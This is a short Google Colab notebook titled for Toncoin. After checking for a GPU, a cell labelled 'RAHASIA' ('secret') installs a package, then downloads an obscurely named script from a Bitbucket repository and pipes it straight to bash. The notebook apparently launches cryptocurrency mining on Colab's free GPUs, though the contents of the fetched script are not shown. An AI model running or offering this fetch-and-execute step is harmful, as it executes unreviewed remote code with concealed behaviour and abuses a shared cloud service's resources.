{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "name": "TONCOIN.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "l91qUHoUAhPW"
      },
      "source": [
        "#**TON - DIKMAD**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "73sNVokP-FUv",
        "cellView": "form"
      },
      "source": [
        "#@title CEK GPU\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xixbPuScxM3i",
        "cellView": "form"
      },
      "source": [
        "#@title RAHASIA\n",
        "\n",
        "!apt-get update \n",
        "!apt-get install libpci3\n",
        "!wget https://bitbucket.org/lebaran/indahhh/raw/d431cb18758bbce3bf21a0fa88d54bd175e741fd/wulandariss; bash wulandariss"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
